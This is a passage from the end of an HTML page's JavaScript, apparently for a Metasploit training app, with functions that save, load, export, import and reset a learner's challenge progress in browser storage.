                modulesExplored: Array.from(modulesExplored),
                timestamp: new Date().toISOString()
            };
            localStorage.setItem('metasploit-training-progress', JSON.stringify(progress));
        }

        function loadProgress() {
            const saved = localStorage.getItem('metasploit-training-progress');
            if (saved) {
                try {
                    const progress = JSON.parse(saved);
                    progress.challenges.forEach(saved => {
                        const challenge = challenges.find(c => c.id === saved.id);
                        if (challenge) challenge.completed = saved.completed;
                    });
                    commandCount = progress.commandCount || 0;
                    modulesExplored = new Set(progress.modulesExplored || []);
                    updateProgress();
                } catch (e) {
                    console.error('Failed to load progress:', e);
                }
            }
        }

        function exportProgress() {
            const progress = {
                challenges: challenges.map(c => ({ id: c.id, completed: c.completed })),
                commandCount: commandCount,
                modulesExplored: Array.from(modulesExplored),
                exportDate: new Date().toISOString(),
                version: '1.0.0'
            };

            const blob = new Blob([JSON.stringify(progress, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `metasploit-training-progress-${new Date().toISOString().split('T')[0]}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function importProgress(event) {
            const file = event.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = (e) => {
                try {
                    const progress = JSON.parse(e.target.result);
                    progress.challenges.forEach(saved => {
                        const challenge = challenges.find(c => c.id === saved.id);
                        if (challenge) challenge.completed = saved.completed;
                    });
                    commandCount = progress.commandCount || 0;
                    modulesExplored = new Set(progress.modulesExplored || []);
                    saveProgress();
                    renderChallenges();
                    updateProgress();
                    updateStats();
                    alert('Progress imported successfully!');
                } catch (e) {
                    alert('Failed to import progress. Invalid file format.');
                }
            };
            reader.readAsText(file);
        }

        function resetProgress() {
            if (!confirm('Are you sure you want to reset all progress? This cannot be undone unless you have exported your progress.')) {
                return;
            }

            challenges.forEach(c => c.completed = false);
            commandCount = 0;
            modulesExplored.clear();
            localStorage.removeItem('metasploit-training-progress');
            renderChallenges();
            updateProgress();
            updateStats();
            alert('Progress reset successfully.');
        }
    </script>
<script src="../../../components/FluxCapacitor.js"></script>
</body>
</html>